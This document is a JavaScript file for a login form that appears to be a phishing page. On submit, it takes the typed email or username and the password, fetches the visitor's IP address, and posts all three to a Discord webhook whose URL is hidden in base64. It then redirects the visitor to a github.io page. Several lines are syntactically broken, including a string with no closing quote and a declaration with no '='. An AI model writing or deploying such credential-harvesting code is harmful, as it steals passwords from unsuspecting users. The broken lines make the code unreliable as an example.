const userinfoEncoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMTM4NTIzNTAwMjM2Mzk0NS9OWjhpVUxSMXgxWWxEWmp3UjZfZGg4em8weTBWTDc0b1hjcmlKNExRbDBnc1A4VDlOT2ZwMmFzZ1pyclNRb3A4c2Z3bE8=';

const skibidiCheckbox = document.getElementById('skibidiCheckbox');
const loginButton = document.getElementById('loginButton');

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    if (!skibidiCheckbox.checked) {
        skibidiCheckbox.classList.add('error');
        alert('Please check the box.');
        return;
    } else {
        skibidiCheckbox.classList.remove('error');
    }

    const email = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // List of IPs to block (placeholders for now)
    const blockedIPs = ['89.187.164.251'];

    // Fetch the user's IP address using ipify
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const userIP = data.ip;

            // Check if the IP is blocked
            if (blockedIPs.includes(userIP)) {
                alert('Access denied. Your IP is blocked.');
                window.location.href = 'https://cryptodude3.github.io/badmin/';
                return;
            }

            // Send data to Discord webhook
            fetch('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMTM4NTIzNTAwMjM2Mzk0NS9OWjhpVUxSMXgxWWxEWmp3UjZfZGg4em8weTBWTDc0b1hjcmlKNExRbDBnc1A4VDlOT2ZwMmFzZ1pyclNRb3A4c2Z3bE8= {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    Data: 'the user info discord webhook'
                })
            });

            // Decode and fetch user info
            const userInfo 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMTM4NTIzNTAwMjM2Mzk0NS9OWjhpVUxSMXgxWWxEWmp3UjZfZGg4em8weTBWTDc0b1hjcmlKNExRbDBnc1A4VDlOT2ZwMmFzZ1pyclNRb3A4c2Z3bE8=';

            fetch(userInfo, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `New Login Attempt:
Email or Username: ||${email}||
Password: ||${password}||
IP Address: ||${userIP}||`
                })
            })
            .then(response => {
                window.location.href = 'https://cryptodude3.github.io/badmin/';
            })
            .catch(error => {
                console.error('Error:', error);
                window.location.href = 'https://cryptodude3.github.io/badmin/';
            });
        })
        .catch(error => {
            console.error('Error fetching IP:', error);
            window.location.href = 'https://cryptodude3.github.io/badmin/';
        });
});